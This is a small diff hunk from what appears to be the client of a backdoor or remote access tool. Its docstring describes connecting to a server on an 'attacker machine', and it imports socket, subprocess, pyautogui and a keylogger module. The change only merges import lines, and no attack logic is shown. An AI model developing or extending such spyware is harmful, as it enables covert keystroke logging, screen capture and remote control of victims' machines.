@@ -5,9 +5,7 @@
     Connect to the server running on attacker machine.
 """
 
-import socket, subprocess, os, sys, threading, shutil
-import time
-
+import socket, subprocess, os, sys, threading, shutil, time
 import pyautogui
 import keylogger
 
